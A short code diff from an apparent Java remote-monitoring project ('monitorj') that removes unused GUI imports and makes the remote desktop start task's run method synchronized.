@@ -5,9 +5,6 @@ import me.jershdervis.monitorj.stub.client.PacketTask;
 import me.jershdervis.monitorj.stub.client.Packets;
 import me.jershdervis.monitorj.stub.client.threads.RemoteDesktopStream;
 
-import javax.swing.*;
-import java.awt.*;
-import java.awt.image.BufferedImage;
 import java.io.IOException;
 
 /**
@@ -22,7 +19,7 @@ public class RemoteDesktopStartTask extends PacketTask {
     }
 
     @Override
-    public void run(BaseClient client) throws IOException {
+    public synchronized void run(BaseClient client) throws IOException {
         (remoteDesktopStream = new Thread(new RemoteDesktopStream(client))).start();
     }
 }
